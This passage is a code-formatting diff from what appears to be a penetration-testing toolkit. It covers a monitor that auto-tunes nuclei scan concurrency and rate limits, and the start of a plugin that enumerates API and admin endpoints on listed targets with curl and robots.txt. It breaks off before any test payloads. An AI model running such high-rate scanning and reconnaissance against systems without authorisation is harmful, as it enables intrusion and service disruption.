# Action to take\n-    parameter: str # Parameter to adjust\n-    adjustment: float # How much to adjust\n+    action: str  # Action to take\n+    parameter: str  # Parameter to adjust\n+    adjustment: float  # How much to adjust\n     description: str\n     priority: int = 1\n \n+\n class PerformanceMonitor:\n     \"\"\"Real-time performance monitoring with automatic optimization\"\"\"\n-    \n+\n     def __init__(self, target_success_rate: float = 0.96):\n         self.target_success_rate = target_success_rate\n         self.is_monitoring = False\n         self.monitor_thread: Optional[threading.Thread] = None\n         self.performance_history: deque = deque(maxlen=1000)\n         self.optimization_rules = self._initialize_optimization_rules()\n         self.current_settings: Dict[str, Any] = self._load_current_settings()\n         self.lock = threading.Lock()\n-        \n+\n         # Performance metrics\n         self.total_operations = 0\n         self.successful_operations = 0\n         self.error_count = 0\n         self.response_times: deque = deque(maxlen=100)\n-        \n+\n         # Auto-tuning parameters\n         self.auto_tuning_enabled = True\n         self.last_optimization_time = datetime.now()\n-        self.optimization_cooldown = timedelta(minutes=5)  # Prevent too frequent changes\n-        \n+        self.optimization_cooldown = timedelta(\n+            minutes=5\n+        )  # Prevent too frequent changes\n+\n     def _initialize_optimization_rules(self) -> List[OptimizationRule]:\n         \"\"\"Initialize optimization rules for automatic tuning\"\"\"\n         return [\n             OptimizationRule(\n                 condition=\"success_rate < 0.9 and cpu_percent > 80\",\n                 action=\"decrease\",\n                 parameter=\"concurrency\",\n                 adjustment=0.8,\n                 description=\"Reduce concurrency when high CPU usage impacts success rate\",\n-                priority=1\n+                priority=1,\n             ),\n             OptimizationRule(\n                 condition=\"success_rate < 0.85\",\n                 action=\"increase\",\n                 parameter=\"timeout\",\n                 adjustment=1.5,\n                 description=\"Increase timeouts when success rate is low\",\n-                priority=2\n+                priority=2,\n             ),\n             OptimizationRule(\n                 condition=\"success_rate < 0.8 and error_count > 10\",\n                 action=\"decrease\",\n                 parameter=\"rate_limit\",\n                 adjustment=0.7,\n                 description=\"Reduce rate limiting when many errors occur\",\n-                priority=1\n+                priority=1,\n             ),\n             OptimizationRule(\n                 condition=\"success_rate > 0.95 and cpu_percent < 50\",\n                 action=\"increase\",\n                 parameter=\"concurrency\",\n                 adjustment=1.2,\n                 description=\"Increase concurrency when performance is good\",\n-                priority=3\n+                priority=3,\n             ),\n             OptimizationRule(\n                 condition=\"memory_percent > 90\",\n                 action=\"decrease\",\n                 parameter=\"parallel_jobs\",\n                 adjustment=0.5,\n                 description=\"Reduce parallel jobs when memory is high\",\n-                priority=1\n+                priority=1,\n             ),\n             OptimizationRule(\n                 condition=\"response_time_avg > 30 and success_rate < 0.9\",\n                 action=\"decrease\",\n                 parameter=\"batch_size\",\n                 adjustment=0.6,\n                 description=\"Reduce batch size when response times are high\",\n-                priority=2\n-            )\n+                priority=2,\n+            ),\n         ]\n-    \n+\n     def _load_current_settings(self) -> Dict[str, Any]:\n         \"\"\"Load current system settings\"\"\"\n         try:\n             config_file = Path(\"p4nth30n.cfg.json\")\n             if config_file.exists():\n-                with open(config_file, 'r') as f:\n+                with open(config_file, \"r\") as f:\n                     return json.load(f)\n         except Exception:\n             pass\n-        \n+\n         # Default settings\n         return {\n             \"limits\": {\n                 \"parallel_jobs\": 20,\n                 \"http_timeout\": 15,\n                 \"rps\": 500,\n-                \"max_concurrent_scans\": 8\n+                \"max_concurrent_scans\": 8,\n             },\n-            \"nuclei\": {\n-                \"rps\": 800,\n-                \"conc\": 150\n-            }\n+            \"nuclei\": {\"rps\": 800, \"conc\": 150},\n         }\n-    \n+\n     def start_monitoring(self, interval: float = 5.0):\n         \"\"\"Start performance monitoring\"\"\"\n         if self.is_monitoring:\n             return\n-        \n+\n         self.is_monitoring = True\n         self.monitor_thread = threading.Thread(\n-            target=self._monitoring_loop,\n-            args=(interval,),\n-            daemon=True\n+            target=self._monitoring_loop, args=(interval,), daemon=True\n         )\n         self.monitor_thread.start()\n-        print(f\"\ud83d\udd0d Performance monitoring started (target success rate: {self.target_success_rate:.1%})\")\n-    \n+        print(\n+            f\"\ud83d\udd0d Performance monitoring started (target success rate: {self.target_success_rate:.1%})\"\n+        )\n+\n     def stop_monitoring(self):\n         \"\"\"Stop performance monitoring\"\"\"\n         self.is_monitoring = False\n         if self.monitor_thread:\n             self.monitor_thread.join(timeout=5)\n         print(\"\ud83d\uded1 Performance monitoring stopped\")\n-    \n+\n     def _monitoring_loop(self, interval: float):\n         \"\"\"Main monitoring loop\"\"\"\n         while self.is_monitoring:\n             try:\n                 snapshot = self._capture_performance_snapshot()\n-                \n+\n                 with self.lock:\n                     self.performance_history.append(snapshot)\n-                \n+\n                 # Check for optimization opportunities\n                 if self.auto_tuning_enabled:\n                     self._check_optimization_triggers(snapshot)\n-                \n+\n                 # Log performance if significantly changed\n                 self._log_performance_changes(snapshot)\n-                \n+\n                 time.sleep(interval)\n-                \n+\n             except Exception as e:\n                 print(f\"\u26a0\ufe0f Monitoring error: {e}\")\n                 time.sleep(interval)\n-    \n+\n     def _capture_performance_snapshot(self) -> PerformanceSnapshot:\n         \"\"\"Capture current system performance\"\"\"\n         # System metrics\n         cpu_percent = psutil.cpu_percent(interval=1)\n         memory = psutil.virtual_memory()\n-        disk = psutil.disk_usage('/')\n-        \n+        disk = psutil.disk_usage(\"/\")\n+\n         # Network I/O\n         network = psutil.net_io_counters()\n         network_io = {\n-            'bytes_sent': network.bytes_sent,\n-            'bytes_recv': network.bytes_recv\n+            \"bytes_sent\": network.bytes_sent,\n+            \"bytes_recv\": network.bytes_recv,\n         }\n-        \n+\n         # Process count\n         active_processes = len(psutil.pids())\n-        \n+\n         # Application metrics\n         success_rate = self.get_current_success_rate()\n         throughput = self.get_current_throughput()\n         error_count = self.error_count\n-        \n+\n         # Response times\n         avg_response_time = 0.0\n         if self.response_times:\n             avg_response_time = statistics.mean(self.response_times)\n-        \n+\n         return PerformanceSnapshot(\n             timestamp=datetime.now(),\n             cpu_percent=cpu_percent,\n             memory_percent=memory.percent,\n             disk_usage_percent=disk.percent,\n             network_io=network_io,\n             active_processes=active_processes,\n             success_rate=success_rate,\n             throughput=throughput,\n             error_count=error_count,\n-            response_time_avg=avg_response_time\n+            response_time_avg=avg_response_time,\n         )\n-    \n+\n     def _check_optimization_triggers(self, snapshot: PerformanceSnapshot):\n         \"\"\"Check if any optimization rules should be triggered\"\"\"\n         # Cooldown check\n         if datetime.now() - self.last_optimization_time < self.optimization_cooldown:\n             return\n-        \n+\n         # Prepare evaluation context\n         context = {\n-            'success_rate': snapshot.success_rate,\n-            'cpu_percent': snapshot.cpu_percent,\n-            'memory_percent': snapshot.memory_percent,\n-            'error_count': snapshot.error_count,\n-            'response_time_avg': snapshot.response_time_avg,\n-            'throughput': snapshot.throughput\n+            \"success_rate\": snapshot.success_rate,\n+            \"cpu_percent\": snapshot.cpu_percent,\n+            \"memory_percent\": snapshot.memory_percent,\n+            \"error_count\": snapshot.error_count,\n+            \"response_time_avg\": snapshot.response_time_avg,\n+            \"throughput\": snapshot.throughput,\n         }\n-        \n+\n         # Sort rules by priority\n         sorted_rules = sorted(self.optimization_rules, key=lambda r: r.priority)\n-        \n+\n         for rule in sorted_rules:\n             try:\n                 if eval(rule.condition, {}, context):\n                     self._apply_optimization(rule, snapshot)\n                     self.last_optimization_time = datetime.now()\n                     break  # Apply only one rule at a time\n             except Exception as e:\n                 print(f\"\u26a0\ufe0f Error evaluating optimization rule: {e}\")\n-    \n-    def _apply_optimization(self, rule: OptimizationRule, snapshot: PerformanceSnapshot):\n+\n+    def _apply_optimization(\n+        self, rule: OptimizationRule, snapshot: PerformanceSnapshot\n+    ):\n         \"\"\"Apply an optimization rule\"\"\"\n         try:\n             current_value = self._get_parameter_value(rule.parameter)\n             if current_value is None:\n                 return\n-            \n+\n             if rule.action == \"increase\":\n                 new_value = current_value * rule.adjustment\n             elif rule.action == \"decrease\":\n                 new_value = current_value * rule.adjustment\n             else:\n                 return\n-            \n+\n             # Apply reasonable bounds\n             new_value = self._apply_parameter_bounds(rule.parameter, new_value)\n-            \n+\n             # Update the parameter\n             success = self._set_parameter_value(rule.parameter, new_value)\n-            \n+\n             if success:\n                 print(f\"\ud83c\udfaf Auto-optimization: {rule.description}\")\n                 print(f\"   \ud83d\udcca {rule.parameter}: {current_value} -> {new_value}\")\n-                print(f\"   \ud83d\udcc8 Success rate: {snapshot.success_rate:.1%} (target: {self.target_success_rate:.1%})\")\n-                \n+                print(\n+                    f\"   \ud83d\udcc8 Success rate: {snapshot.success_rate:.1%} (target: {self.target_success_rate:.1%})\"\n+                )\n+\n                 # Log the optimization\n                 self._log_optimization(rule, current_value, new_value, snapshot)\n-        \n+\n         except Exception as e:\n             print(f\"\u26a0\ufe0f Failed to apply optimization: {e}\")\n-    \n+\n     def _get_parameter_value(self, parameter: str) -> Optional[float]:\n         \"\"\"Get current value of a parameter\"\"\"\n         try:\n             if parameter == \"concurrency\":\n                 return self.current_settings.get(\"nuclei\", {}).get(\"conc\", 150)\n@@ -293,262 +301,308 @@\n             elif parameter == \"rate_limit\":\n                 return self.current_settings.get(\"nuclei\", {}).get(\"rps\", 800)\n             elif parameter == \"parallel_jobs\":\n                 return self.current_settings.get(\"limits\", {}).get(\"parallel_jobs\", 20)\n             elif parameter == \"batch_size\":\n-                return self.current_settings.get(\"limits\", {}).get(\"max_concurrent_scans\", 8)\n+                return self.current_settings.get(\"limits\", {}).get(\n+                    \"max_concurrent_scans\", 8\n+                )\n         except Exception:\n             pass\n         return None\n-    \n+\n     def _set_parameter_value(self, parameter: str, value: float) -> bool:\n         \"\"\"Set a parameter value\"\"\"\n         try:\n             value = int(value)  # Convert to int for most parameters\n-            \n+\n             if parameter == \"concurrency\":\n                 self.current_settings.setdefault(\"nuclei\", {})[\"conc\"] = value\n             elif parameter == \"timeout\":\n                 self.current_settings.setdefault(\"limits\", {})[\"http_timeout\"] = value\n             elif parameter == \"rate_limit\":\n                 self.current_settings.setdefault(\"nuclei\", {})[\"rps\"] = value\n             elif parameter == \"parallel_jobs\":\n                 self.current_settings.setdefault(\"limits\", {})[\"parallel_jobs\"] = value\n             elif parameter == \"batch_size\":\n-                self.current_settings.setdefault(\"limits\", {})[\"max_concurrent_scans\"] = value\n+                self.current_settings.setdefault(\"limits\", {})[\n+                    \"max_concurrent_scans\"\n+                ] = value\n             else:\n                 return False\n-            \n+\n             # Save to config file\n             self._save_settings()\n             return True\n-        \n+\n         except Exception as e:\n             print(f\"\u26a0\ufe0f Failed to set parameter {parameter}: {e}\")\n             return False\n-    \n+\n     def _apply_parameter_bounds(self, parameter: str, value: float) -> float:\n         \"\"\"Apply reasonable bounds to parameter values\"\"\"\n         bounds = {\n             \"concurrency\": (10, 300),\n             \"timeout\": (5, 120),\n             \"rate_limit\": (50, 2000),\n             \"parallel_jobs\": (1, 50),\n-            \"batch_size\": (1, 20)\n+            \"batch_size\": (1, 20),\n         }\n-        \n+\n         if parameter in bounds:\n             min_val, max_val = bounds[parameter]\n             return max(min_val, min(max_val, value))\n-        \n+\n         return value\n-    \n+\n     def _save_settings(self):\n         \"\"\"Save current settings to config file\"\"\"\n         try:\n             config_file = Path(\"p4nth30n.cfg.json\")\n-            with open(config_file, 'w') as f:\n+            with open(config_file, \"w\") as f:\n                 json.dump(self.current_settings, f, indent=2)\n         except Exception as e:\n             print(f\"\u26a0\ufe0f Failed to save settings: {e}\")\n-    \n-    def _log_optimization(self, rule: OptimizationRule, old_value: float, new_value: float, snapshot: PerformanceSnapshot):\n+\n+    def _log_optimization(\n+        self,\n+        rule: OptimizationRule,\n+        old_value: float,\n+        new_value: float,\n+        snapshot: PerformanceSnapshot,\n+    ):\n         \"\"\"Log optimization actions\"\"\"\n         log_entry = {\n-            'timestamp': datetime.now().isoformat(),\n-            'rule': rule.description,\n-            'parameter': rule.parameter,\n-            'old_value': old_value,\n-            'new_value': new_value,\n-            'trigger_condition': rule.condition,\n-            'system_state': {\n-                'success_rate': snapshot.success_rate,\n-                'cpu_percent': snapshot.cpu_percent,\n-                'memory_percent': snapshot.memory_percent,\n-                'error_count': snapshot.error_count\n-            }\n+            \"timestamp\": datetime.now().isoformat(),\n+            \"rule\": rule.description,\n+            \"parameter\": rule.parameter,\n+            \"old_value\": old_value,\n+            \"new_value\": new_value,\n+            \"trigger_condition\": rule.condition,\n+            \"system_state\": {\n+                \"success_rate\": snapshot.success_rate,\n+                \"cpu_percent\": snapshot.cpu_percent,\n+                \"memory_percent\": snapshot.memory_percent,\n+                \"error_count\": snapshot.error_count,\n+            },\n         }\n-        \n+\n         # Append to optimization log\n         log_file = Path(\"logs/optimizations.jsonl\")\n         log_file.parent.mkdir(exist_ok=True)\n-        \n+\n         try:\n-            with open(log_file, 'a') as f:\n-                f.write(json.dumps(log_entry) + '\\n')\n+            with open(log_file, \"a\") as f:\n+                f.write(json.dumps(log_entry) + \"\\n\")\n         except Exception as e:\n             print(f\"\u26a0\ufe0f Failed to log optimization: {e}\")\n-    \n+\n     def _log_performance_changes(self, snapshot: PerformanceSnapshot):\n         \"\"\"Log significant performance changes\"\"\"\n         if len(self.performance_history) < 2:\n             return\n-        \n+\n         previous = self.performance_history[-2]\n-        \n+\n         # Check for significant changes\n         success_change = abs(snapshot.success_rate - previous.success_rate)\n         cpu_change = abs(snapshot.cpu_percent - previous.cpu_percent)\n-        \n+\n         if success_change > 0.05 or cpu_change > 20:\n             print(f\"\ud83d\udcca Performance change detected:\")\n-            print(f\"   Success rate: {previous.success_rate:.1%} -> {snapshot.success_rate:.1%}\")\n-            print(f\"   CPU usage: {previous.cpu_percent:.1f}% -> {snapshot.cpu_percent:.1f}%\")\n-    \n+            print(\n+                f\"   Success rate: {previous.success_rate:.1%} -> {snapshot.success_rate:.1%}\"\n+            )\n+            print(\n+                f\"   CPU usage: {previous.cpu_percent:.1f}% -> {snapshot.cpu_percent:.1f}%\"\n+            )\n+\n     def record_operation(self, success: bool, response_time: float = 0.0):\n         \"\"\"Record the result of an operation\"\"\"\n         with self.lock:\n             self.total_operations += 1\n             if success:\n                 self.successful_operations += 1\n             else:\n                 self.error_count += 1\n-            \n+\n             if response_time > 0:\n                 self.response_times.append(response_time)\n-    \n+\n     def get_current_success_rate(self) -> float:\n         \"\"\"Get current success rate\"\"\"\n         if self.total_operations == 0:\n             return 1.0  # No operations yet\n         return self.successful_operations / self.total_operations\n-    \n+\n     def get_current_throughput(self) -> float:\n         \"\"\"Get current throughput (operations per minute)\"\"\"\n         if len(self.performance_history) < 2:\n             return 0.0\n-        \n+\n         recent_snapshots = list(self.performance_history)[-10:]  # Last 10 snapshots\n         if len(recent_snapshots) < 2:\n             return 0.0\n-        \n-        time_span = (recent_snapshots[-1].timestamp - recent_snapshots[0].timestamp).total_seconds()\n+\n+        time_span = (\n+            recent_snapshots[-1].timestamp - recent_snapshots[0].timestamp\n+        ).total_seconds()\n         if time_span == 0:\n             return 0.0\n-        \n+\n         # Approximate throughput based on total operations\n         return (self.total_operations / time_span) * 60  # per minute\n-    \n+\n     def get_performance_report(self) -> Dict[str, Any]:\n         \"\"\"Get comprehensive performance report\"\"\"\n-        current_snapshot = self.performance_history[-1] if self.performance_history else None\n-        \n+        current_snapshot = (\n+            self.performance_history[-1] if self.performance_history else None\n+        )\n+\n         report = {\n-            'current_success_rate': self.get_current_success_rate(),\n-            'target_success_rate': self.target_success_rate,\n-            'success_rate_gap': self.target_success_rate - self.get_current_success_rate(),\n-            'total_operations': self.total_operations,\n-            'error_count': self.error_count,\n-            'throughput': self.get_current_throughput(),\n-            'auto_tuning_enabled': self.auto_tuning_enabled,\n-            'monitoring_active': self.is_monitoring\n+            \"current_success_rate\": self.get_current_success_rate(),\n+            \"target_success_rate\": self.target_success_rate,\n+            \"success_rate_gap\": self.target_success_rate\n+            - self.get_current_success_rate(),\n+            \"total_operations\": self.total_operations,\n+            \"error_count\": self.error_count,\n+            \"throughput\": self.get_current_throughput(),\n+            \"auto_tuning_enabled\": self.auto_tuning_enabled,\n+            \"monitoring_active\": self.is_monitoring,\n         }\n-        \n+\n         if current_snapshot:\n-            report.update({\n-                'cpu_percent': current_snapshot.cpu_percent,\n-                'memory_percent': current_snapshot.memory_percent,\n-                'disk_usage_percent': current_snapshot.disk_usage_percent,\n-                'avg_response_time': current_snapshot.response_time_avg\n-            })\n-        \n+            report.update(\n+                {\n+                    \"cpu_percent\": current_snapshot.cpu_percent,\n+                    \"memory_percent\": current_snapshot.memory_percent,\n+                    \"disk_usage_percent\": current_snapshot.disk_usage_percent,\n+                    \"avg_response_time\": current_snapshot.response_time_avg,\n+                }\n+            )\n+\n         # Performance trend\n         if len(self.performance_history) >= 10:\n-            recent_success_rates = [s.success_rate for s in list(self.performance_history)[-10:]]\n-            report['success_rate_trend'] = statistics.mean(recent_success_rates)\n-        \n+            recent_success_rates = [\n+                s.success_rate for s in list(self.performance_history)[-10:]\n+            ]\n+            report[\"success_rate_trend\"] = statistics.mean(recent_success_rates)\n+\n         # Recommendations\n         recommendations = []\n         current_success_rate = self.get_current_success_rate()\n-        \n+\n         if current_success_rate < self.target_success_rate:\n             gap = self.target_success_rate - current_success_rate\n             if gap > 0.1:\n-                recommendations.append(\"Critical: Success rate significantly below target\")\n+                recommendations.append(\n+                    \"Critical: Success rate significantly below target\"\n+                )\n             elif gap > 0.05:\n                 recommendations.append(\"Warning: Success rate below target\")\n             else:\n                 recommendations.append(\"Minor: Success rate slightly below target\")\n-        \n+\n         if current_snapshot:\n             if current_snapshot.cpu_percent > 90:\n-                recommendations.append(\"High CPU usage detected - consider reducing concurrency\")\n+                recommendations.append(\n+                    \"High CPU usage detected - consider reducing concurrency\"\n+                )\n             if current_snapshot.memory_percent > 90:\n-                recommendations.append(\"High memory usage detected - reduce parallel operations\")\n-        \n-        report['recommendations'] = recommendations\n-        \n+                recommendations.append(\n+                    \"High memory usage detected - reduce parallel operations\"\n+                )\n+\n+        report[\"recommendations\"] = recommendations\n+\n         return report\n-    \n+\n     def export_performance_data(self, file_path: str):\n         \"\"\"Export performance data for analysis\"\"\"\n         export_data = {\n-            'timestamp': datetime.now().isoformat(),\n-            'monitoring_period': {\n-                'start': self.performance_history[0].timestamp.isoformat() if self.performance_history else None,\n-                'end': self.performance_history[-1].timestamp.isoformat() if self.performance_history else None,\n-                'duration_minutes': len(self.performance_history) * 5 / 60  # Assuming 5-second intervals\n+            \"timestamp\": datetime.now().isoformat(),\n+            \"monitoring_period\": {\n+                \"start\": (\n+                    self.performance_history[0].timestamp.isoformat()\n+                    if self.performance_history\n+                    else None\n+                ),\n+                \"end\": (\n+                    self.performance_history[-1].timestamp.isoformat()\n+                    if self.performance_history\n+                    else None\n+                ),\n+                \"duration_minutes\": len(self.performance_history)\n+                * 5\n+                / 60,  # Assuming 5-second intervals\n             },\n-            'summary': self.get_performance_report(),\n-            'performance_snapshots': [\n+            \"summary\": self.get_performance_report(),\n+            \"performance_snapshots\": [\n                 {\n-                    'timestamp': s.timestamp.isoformat(),\n-                    'cpu_percent': s.cpu_percent,\n-                    'memory_percent': s.memory_percent,\n-                    'success_rate': s.success_rate,\n-                    'throughput': s.throughput,\n-                    'error_count': s.error_count,\n-                    'response_time_avg': s.response_time_avg\n+                    \"timestamp\": s.timestamp.isoformat(),\n+                    \"cpu_percent\": s.cpu_percent,\n+                    \"memory_percent\": s.memory_percent,\n+                    \"success_rate\": s.success_rate,\n+                    \"throughput\": s.throughput,\n+                    \"error_count\": s.error_count,\n+                    \"response_time_avg\": s.response_time_avg,\n                 }\n                 for s in self.performance_history\n-            ]\n+            ],\n         }\n-        \n-        with open(file_path, 'w') as f:\n+\n+        with open(file_path, \"w\") as f:\n             json.dump(export_data, f, indent=2)\n+\n \n # Global performance monitor instance\n performance_monitor = PerformanceMonitor()\n+\n \n def start_performance_monitoring(target_success_rate: float = 0.96):\n     \"\"\"Start performance monitoring with specified target\"\"\"\n     performance_monitor.target_success_rate = target_success_rate\n     performance_monitor.start_monitoring()\n \n+\n def stop_performance_monitoring():\n     \"\"\"Stop performance monitoring\"\"\"\n     performance_monitor.stop_monitoring()\n \n+\n def record_operation_result(success: bool, response_time: float = 0.0):\n     \"\"\"Record an operation result for performance tracking\"\"\"\n     performance_monitor.record_operation(success, response_time)\n \n+\n def get_current_performance_metrics() -> Dict[str, Any]:\n     \"\"\"Get current performance metrics\"\"\"\n     return performance_monitor.get_performance_report()\n+\n \n def is_success_rate_target_met() -> bool:\n     \"\"\"Check if success rate target is being met\"\"\"\n     current_rate = performance_monitor.get_current_success_rate()\n     return current_rate >= performance_monitor.target_success_rate\n \n+\n if __name__ == \"__main__\":\n     # Test the performance monitor\n     print(\"Performance Monitor - Test\")\n-    \n+\n     start_performance_monitoring(0.96)\n-    \n+\n     # Simulate some operations\n     for i in range(50):\n         success = i % 5 != 0  # 80% success rate\n         response_time = 2.0 + (i % 10) * 0.5\n         record_operation_result(success, response_time)\n         time.sleep(0.1)\n-    \n+\n     time.sleep(5)  # Let monitor collect data\n-    \n+\n     report = get_current_performance_metrics()\n     print(f\"Current success rate: {report['current_success_rate']:.1%}\")\n     print(f\"Target success rate: {report['target_success_rate']:.1%}\")\n     print(f\"Target met: {is_success_rate_target_met()}\")\n-    \n-    stop_performance_monitoring()\n\\ No newline at end of file\n+\n+    stop_performance_monitoring()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/api_security_scanner.py\t2025-09-14 19:10:58.579755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/api_security_scanner.py\t2025-09-14 19:23:12.591963+00:00\n@@ -9,469 +9,581 @@\n import re\n \n plugin_info = {\n     \"name\": \"API Security Scanner\",\n     \"description\": \"Comprehensive API security testing including REST, GraphQL, and SOAP\",\n-    \"version\": \"1.0.0\", \n+    \"version\": \"1.0.0\",\n     \"author\": \"@cxb3rf1lth\",\n     \"category\": \"vulnerability_scanning\",\n     \"requires_internet\": True,\n-    \"risk_level\": \"medium\"\n+    \"risk_level\": \"medium\",\n }\n+\n \n def execute(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n     \"\"\"Execute comprehensive API security scanning\"\"\"\n     api_dir = run_dir / \"api_security\"\n     api_dir.mkdir(exist_ok=True)\n-    \n+\n     # Read targets\n     targets_file = Path(__file__).parent.parent / \"targets.txt\"\n     if not targets_file.exists():\n         print(\"[API] No targets file found\")\n         return\n-    \n+\n     targets = []\n-    with open(targets_file, 'r') as f:\n+    with open(targets_file, \"r\") as f:\n         for line in f:\n             target = line.strip()\n-            if target and not target.startswith('#'):\n+            if target and not target.startswith(\"#\"):\n                 targets.append(target)\n-    \n+\n     if not targets:\n         print(\"[API] No targets found\")\n         return\n-    \n+\n     results = {}\n-    \n+\n     for target in targets:\n         print(f\"[API] Scanning target: {target}\")\n         target_results = {}\n-        \n+\n         # 1. API Endpoint Discovery\n         try:\n             endpoints = discover_api_endpoints(target)\n             target_results[\"endpoint_discovery\"] = endpoints\n         except Exception as e:\n             print(f\"[API] Endpoint discovery error: {e}\")\n-        \n+\n         # 2. REST API Testing\n         try:\n             rest_results = test_rest_api_security(target)\n             target_results[\"rest_api_security\"] = rest_results\n         except Exception as e:\n             print(f\"[API] REST API testing error: {e}\")\n-        \n+\n         # 3. GraphQL Security Testing\n         try:\n             graphql_results = test_graphql_security(target)\n             target_results[\"graphql_security\"] = graphql_results\n         except Exception as e:\n             print(f\"[API] GraphQL testing error: {e}\")\n-        \n+\n         # 4. Authentication and Authorization Testing\n         try:\n             auth_results = test_authentication_security(target)\n             target_results[\"authentication_security\"] = auth_results\n         except Exception as e:\n             print(f\"[API] Authentication testing error: {e}\")\n-        \n+\n         # 5. Rate Limiting and DoS Testing\n         try:\n             rate_limit_results = test_rate_limiting(target)\n             target_results[\"rate_limiting\"] = rate_limit_results\n         except Exception as e:\n             print(f\"[API] Rate limiting testing error: {e}\")\n-        \n+\n         results[target] = target_results\n-    \n+\n     # Save results\n     output_file = api_dir / \"api_security_results.json\"\n-    with open(output_file, 'w') as f:\n+    with open(output_file, \"w\") as f:\n         json.dump(results, f, indent=2, default=str)\n-    \n+\n     print(f\"[API] API security results saved to: {output_file}\")\n+\n \n def discover_api_endpoints(target: str) -> Dict[str, Any]:\n     \"\"\"Discover API endpoints through various methods\"\"\"\n     results = {\n         \"discovered_endpoints\": [],\n         \"swagger_docs\": [],\n         \"openapi_specs\": [],\n         \"common_paths\": [],\n-        \"timestamp\": time.time()\n+        \"timestamp\": time.time(),\n     }\n-    \n+\n     # Common API paths to check\n     api_paths = [\n-        \"/api\", \"/api/v1\", \"/api/v2\", \"/api/v3\",\n-        \"/rest\", \"/graphql\", \"/swagger\", \"/swagger.json\",\n-        \"/openapi.json\", \"/api-docs\", \"/docs\",\n-        \"/spec\", \"/swagger-ui\", \"/redoc\",\n-        \"/.well-known/openapi\", \"/health\", \"/status\",\n-        \"/metrics\", \"/admin/api\", \"/v1\", \"/v2\"\n+        \"/api\",\n+        \"/api/v1\",\n+        \"/api/v2\",\n+        \"/api/v3\",\n+        \"/rest\",\n+        \"/graphql\",\n+        \"/swagger\",\n+        \"/swagger.json\",\n+        \"/openapi.json\",\n+        \"/api-docs\",\n+        \"/docs\",\n+        \"/spec\",\n+        \"/swagger-ui\",\n+        \"/redoc\",\n+        \"/.well-known/openapi\",\n+        \"/health\",\n+        \"/status\",\n+        \"/metrics\",\n+        \"/admin/api\",\n+        \"/v1\",\n+        \"/v2\",\n     ]\n-    \n-    base_url = target.rstrip('/')\n-    \n+\n+    base_url = target.rstrip(\"/\")\n+\n     for path in api_paths:\n         try:\n             test_url = urljoin(base_url, path)\n-            cmd = [\"curl\", \"-s\", \"-I\", \"--max-time\", \"10\", \"-w\", \"%{http_code}\", test_url]\n-            \n+            cmd = [\n+                \"curl\",\n+                \"-s\",\n+                \"-I\",\n+                \"--max-time\",\n+                \"10\",\n+                \"-w\",\n+                \"%{http_code}\",\n+                test_url,\n+            ]\n+\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-            \n+\n             if result.returncode == 0:\n-                lines = result.stdout.strip().split('\\n')\n+                lines = result.stdout.strip().split(\"\\n\")\n                 status_code = lines[-1] if lines else \"000\"\n-                \n-                if status_code.startswith(('2', '3', '4')):  # Any response\n+\n+                if status_code.startswith((\"2\", \"3\", \"4\")):  # Any response\n                     endpoint_info = {\n                         \"path\": path,\n                         \"url\": test_url,\n                         \"status_code\": status_code,\n-                        \"discovered_method\": \"path_enumeration\"\n+                        \"discovered_method\": \"path_enumeration\",\n                     }\n-                    \n+\n                     # Check content for API indicators\n                     content_cmd = [\"curl\", \"-s\", \"--max-time\", \"10\", test_url]\n-                    content_result = subprocess.run(content_cmd, capture_output=True, text=True, timeout=15)\n-                    \n+                    content_result = subprocess.run(\n+                        content_cmd, capture_output=True, text=True, timeout=15\n+                    )\n+\n                     if content_result.returncode == 0:\n                         content = content_result.stdout.lower()\n-                        \n+\n                         # Check for Swagger/OpenAPI\n-                        if any(term in content for term in ['swagger', 'openapi', 'api-docs']):\n+                        if any(\n+                            term in content\n+                            for term in [\"swagger\", \"openapi\", \"api-docs\"]\n+                        ):\n                             endpoint_info[\"type\"] = \"documentation\"\n-                            if 'swagger' in content:\n+                            if \"swagger\" in content:\n                                 results[\"swagger_docs\"].append(endpoint_info)\n-                            if 'openapi' in content:\n+                            if \"openapi\" in content:\n                                 results[\"openapi_specs\"].append(endpoint_info)\n-                        \n+\n                         # Check for API responses\n-                        elif any(term in content for term in ['{\"', '\"api\"', '\"version\"', '\"data\"']):\n+                        elif any(\n+                            term in content\n+                            for term in ['{\"', '\"api\"', '\"version\"', '\"data\"']\n+                        ):\n                             endpoint_info[\"type\"] = \"api_endpoint\"\n                             endpoint_info[\"response_type\"] = \"json\"\n-                        \n+\n                         # Check for GraphQL\n-                        elif 'graphql' in content or 'query' in content:\n+                        elif \"graphql\" in content or \"query\" in content:\n                             endpoint_info[\"type\"] = \"graphql\"\n-                    \n+\n                     results[\"discovered_endpoints\"].append(endpoint_info)\n-            \n+\n         except Exception as e:\n             continue\n-    \n+\n     # Additional endpoint discovery through robots.txt\n     try:\n         robots_url = urljoin(base_url, \"/robots.txt\")\n         cmd = [\"curl\", \"-s\", \"--max-time\", \"10\", robots_url]\n         result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)\n-        \n+\n         if result.returncode == 0 and result.stdout:\n             # Parse robots.txt for API paths\n-            for line in result.stdout.split('\\n'):\n-                if 'disallow:' in line.lower():\n-                    path = line.split(':', 1)[1].strip()\n-                    if any(api_term in path.lower() for api_term in ['api', 'rest', 'graphql']):\n-                        results[\"discovered_endpoints\"].append({\n-                            \"path\": path,\n-                            \"url\": urljoin(base_url, path),\n-                            \"discovered_method\": \"robots_txt\",\n-                            \"type\": \"potential_api\"\n-                        })\n-    \n+            for line in result.stdout.split(\"\\n\"):\n+                if \"disallow:\" in line.lower():\n+                    path = line.split(\":\", 1)[1].strip()\n+                    if any(\n+                        api_term in path.lower()\n+                        for api_term in [\"api\", \"rest\", \"graphql\"]\n+                    ):\n+                        results[\"discovered_endpoints\"].append(\n+                            {\n+                                \"path\": path,\n+                                \"url\": urljoin(base_url, path),\n+                                \"discovered_method\": \"robots_txt\",\n+                                \"type\": \"potential_api\",\n+                            }\n+                        )\n+\n     except Exception as e:\n-            logging.warning(f\"Operation failed: {e}\")\n-            # Consider if this error should be handled differently\n+        logging.warning(f\"Operation failed: {e}\")\n+        # Consider if this error should be handled differently\n     return results\n+\n \n def test_rest_api_security(target: str) -> Dict[str, Any]:\n     \"\"\"Test REST API security vulnerabilities\"\"\"\n     results = {\n         \"injection_tests\": [],\n         \"method_tampering\": 